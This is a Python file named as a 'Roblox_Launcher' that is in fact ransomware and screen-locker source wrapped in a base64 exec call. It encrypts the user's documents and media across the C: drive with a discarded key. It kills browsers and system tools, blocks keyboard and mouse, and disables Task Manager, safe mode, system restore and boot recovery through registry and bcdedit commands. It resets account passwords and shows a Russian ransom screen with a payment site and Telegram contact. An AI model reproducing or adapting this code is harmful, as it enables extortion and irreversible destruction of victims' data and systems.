import base64

Roblox_Launcher = "import pygame
import keyboard
import win32gui
import win32con
import win32api
import os
import sys
import random
import string
import subprocess
import psutil
import time
import socket
import ctypes
import win32process
from threading import Thread
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import glob

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, 1
        )
        sys.exit()

run_as_admin()

pygame.init()
random_window_name = ''.join(random.choices(string.ascii_lowercase, k=12))
screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
pygame.display.set_caption(random_window_name)

GREEN = (0, 255, 0)
WHITE = (255, 255, 255)
BLACK = (0, 0, 0)
PURPLE = (128, 0, 128)

font = pygame.font.SysFont("arial", 36)
skull_font = pygame.font.SysFont("arial", 100)
timer_font = pygame.font.SysFont("arial", 48)

message = [
    "Ты попал братишка:)",
    "Хочешь выбраться? Иди на https://vinlocker.pay.org/home",
    "Сайт не работает? Пиши в тг @Spofty_123",
    "Хаахахахах"
]

computer_name = socket.gethostname()
footer_text = f"{computer_name}, успей спасти!"

timer_duration = 600
start_time = time.time()

file_extensions = ['.jpg', '.jpeg', '.png', '.doc', '.docx', '.pdf', '.txt', '.mp4', '.mp3']
blocked_processes = ['chrome.exe', 'firefox.exe', 'msedge.exe', 'opera.exe', 'telegram.exe', 'taskkill.exe', 'procexp.exe', 'regedit.exe', 'msconfig.exe']

def encrypt_files():
    key = get_random_bytes(32)
    for root, _, files in os.walk('C:\\'):
        for file in files:
            if any(file.endswith(ext) for ext in file_extensions):
                file_path = os.path.join(root, file)
                try:
                    with open(file_path, 'rb') as f:
                        data = f.read()
                    cipher = AES.new(key, AES.MODE_EAX)
                    ciphertext, tag = cipher.encrypt_and_digest(data)
                    with open(file_path + '.locked', 'wb') as f:
                        f.write(cipher.nonce + tag + ciphertext)
                    os.remove(file_path)
                except:
                    pass
    try:
        os.remove('encryption_key.bin')
    except:
        pass

def block_keys():
    keyboard.block_key("alt+shift")
    keyboard.block_key("alt+f4")
    keyboard.block_key("ctrl+shift+esc")
    keyboard.block_key("ctrl+alt+del")
    keyboard.block_key("win")
    keyboard.block_key("f1")
    keyboard.block_key("f2")
    keyboard.block_key("f3")
    keyboard.block_key("f4")
    keyboard.block_key("f5")
    keyboard.block_key("f6")
    keyboard.block_key("f7")
    keyboard.block_key("f8")
    keyboard.block_key("f9")
    keyboard.block_key("f10")
    keyboard.block_key("f11")
    keyboard.block_key("f12")
    keyboard.block_key("shift+f8")
    keyboard.block_key("win+r")
    keyboard.block_key("esc")
    keyboard.block_key("del")
    keyboard.block_key("shift+f10")
    keyboard.block_key("shift+f12")
    keyboard.block_key("ctrl+shift+enter")
    keyboard.block_key("win+tab")
    keyboard.block_key("alt+tab")
    keyboard.block_key("win+d")
    keyboard.block_key("ctrl+esc")
    keyboard.block_key("win+e")
    keyboard.block_key("win+l")
    keyboard.block_key("win+m")
    keyboard.block_key("win+shift+m")
    keyboard.block_key("ctrl+shift")
    keyboard.block_key("alt+enter")
    keyboard.block_key("win+shift+left")
    keyboard.block_key("win+shift+right")
    keyboard.block_key("win+up")
    keyboard.block_key("win+down")
    keyboard.block_key("print screen")
    keyboard.block_key("alt+print screen")
    keyboard.block_key("win+shift+s")
    keyboard.block_key("win+pause")
    keyboard.block_key("ctrl+alt+shift")
    keyboard.block_key("win+shift")
    keyboard.block_key("alt+space")
    keyboard.block_key("win+left")
    keyboard.block_key("win+right")

def block_mouse():
    while True:
        win32api.SetCursorPos((0, 0))
        win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
        win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
        win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0)
        win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0)
        time.sleep(0.05)

def block_processes():
    while True:
        try:
            for proc in psutil.process_iter(['name']):
                if proc.info['name'].lower() in blocked_processes:
                    proc.kill()
        except:
            pass
        time.sleep(0.1)

def disable_task_manager():
    try:
        subprocess.run('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f', shell=True)
    except:
        pass

def block_shutdown():
    try:
        subprocess.run('REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRestart /t REG_DWORD /d 1 /f', shell=True)
        subprocess.run('REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableShutdown /t REG_DWORD /d 1 /f', shell=True)
    except:
        pass

def disable_context_menu():
    try:
        subprocess.run('REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoViewContextMenu /t REG_DWORD /d 1 /f', shell=True)
    except:
        pass

def disable_start_menu():
    try:
        subprocess.run('REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoStartMenu /t REG_DWORD /d 1 /f', shell=True)
    except:
        pass

def disable_cmd_powershell():
    try:
        subprocess.run('REG ADD "HKCU\\Software\\Policies\\Microsoft\\Windows\\System" /v DisableCMD /t REG_DWORD /d 2 /f', shell=True)
    except:
        pass

def disable_explorer():
    try:
        subprocess.run('taskkill /F /IM explorer.exe', shell=True)
    except:
        pass

def disable_safe_mode():
    try:
        subprocess.run('bcdedit /set {default} safeboot deletevalue', shell=True)
        subprocess.run('REG ADD "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot" /v DisableSafeBoot /t REG_DWORD /d 1 /f', shell=True)
        subprocess.run('bcdedit /deletevalue {default} bootmenupolicy', shell=True)
    except:
        pass

def disable_system_restore():
    try:
        subprocess.run('REG ADD "HKLM\\Software\\Policies\\Microsoft\\Windows NT\\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f', shell=True)
    except:
        pass

def disable_regedit():
    try:
        subprocess.run('REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f', shell=True)
    except:
        pass

def disable_usb_boot():
    try:
        subprocess.run('bcdedit /set {bootmgr} device partition=C:', shell=True)
        subprocess.run('bcdedit /set {default} device partition=C:', shell=True)
        subprocess.run('bcdedit /set {bootmgr} nointegritychecks Yes', shell=True)
        subprocess.run('REG ADD "HKLM\\SYSTEM\\CurrentControlSet\\Control" /v StorageDevicePolicies /t REG_DWORD /d 1 /f', shell=True)
    except:
        pass

def modify_bootloader():
    try:
        subprocess.run('bcdedit /set {bootmgr} displaybootmenu yes', shell=True)
        subprocess.run('bcdedit /set {default} bootstatuspolicy ignoreallfailures', shell=True)
        subprocess.run('bcdedit /set {default} recoveryenabled No', shell=True)
        subprocess.run('bcdedit /set {default} nx AlwaysOff', shell=True)
        with open('C:\\boot_message.txt', 'w') as f:
            f.write("Твой ПК всё ещё под замком! Пиши в тг @Spofty_123.")
    except:
        pass

def corrupt_boot():
    try:
        subprocess.run('bcdedit /set {default} recoveryenabled Yes', shell=True)
        subprocess.run('bcdedit /set {default} bootstatuspolicy DisplayAllErrors', shell=True)
        subprocess.run('bcdedit /set {bootmgr} timeout 0', shell=True)
    except:
        pass

def mask_process():
    try:
        current_process = psutil.Process()
        random_name = random.choice(["svchost.exe", "csrss.exe", "winlogon.exe"])
        current_process.name(random_name)
    except:
        pass

def anti_debug():
    if ctypes.windll.kernel32.IsDebuggerPresent():
        sys.exit()
    try:
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() in ['cheatengine.exe', 'x64dbg.exe', 'ollydbg.exe']:
                sys.exit()
    except:
        pass

def lock_windows():
    try:
        subprocess.run('net user Administrator winlocker0!@@ /active:yes', shell=True)
        subprocess.run('net user %username% winlocker0!@@', shell=True)
        ctypes.windll.user32.LockWorkStation()
    except:
        pass

def set_window_ontop():
    hwnd = pygame.display.get_wm_info()["window"]
    win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)

def main():
    encrypt_files()
    modify_bootloader()
    disable_task_manager()
    block_shutdown()
    disable_context_menu()
    disable_start_menu()
    disable_cmd_powershell()
    disable_explorer()
    disable_safe_mode()
    disable_system_restore()
    disable_regedit()
    disable_usb_boot()
    Thread(target=block_keys, daemon=True).start()
    Thread(target=mask_process, daemon=True).start()
    Thread(target=anti_debug, daemon=True).start()
    Thread(target=block_mouse, daemon=True).start()
    Thread(target=block_processes, daemon=True).start()

    timer_expired = False
    running = True
    while running:
        screen.fill(BLACK)
        skull_text = skull_font.render("☠️", True, GREEN)
        screen.blit(skull_text, (screen.get_width() // 2 - 50, 100))
        first_line = font.render(message[0], True, PURPLE)
        screen.blit(first_line, (50, screen.get_height() - 150))
        for i, line in enumerate(message[1:], 1):
            text = font.render(line, True, WHITE)
            screen.blit(text, (50, 300 + (i - 1) * 50))
        footer = font.render(footer_text, True, WHITE)
        screen.blit(footer, (50, screen.get_height() - 100))
        elapsed_time = time.time() - start_time
        remaining_time = max(0, timer_duration - elapsed_time)
        minutes = int(remaining_time // 60)
        seconds = int(remaining_time % 60)
        timer_text = timer_font.render(f"Осталось: {minutes:02d}:{seconds:02d}", True, GREEN)
        screen.blit(timer_text, (screen.get_width() // 2 - 100, screen.get_height() - 200))
        if remaining_time <= 0 and not timer_expired:
            lock_windows()
            corrupt_boot()
            timer_expired = True
        pygame.display.flip()
        set_window_ontop()
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pass
        if keyboard.is_pressed("alt+f4") or keyboard.is_pressed("ctrl+alt+del") or keyboard.is_pressed("win") or keyboard.is_pressed("f8") or keyboard.is_pressed("win+r") or keyboard.is_pressed("esc") or keyboard.is_pressed("del") or keyboard.is_pressed("f2") or keyboard.is_pressed("f10") or keyboard.is_pressed("f12"):
            continue
        time.sleep(0.05)
    pygame.quit()

if __name__ == "__main__":
    main()"


exec(base64.b64decode(Roblox_Launcher))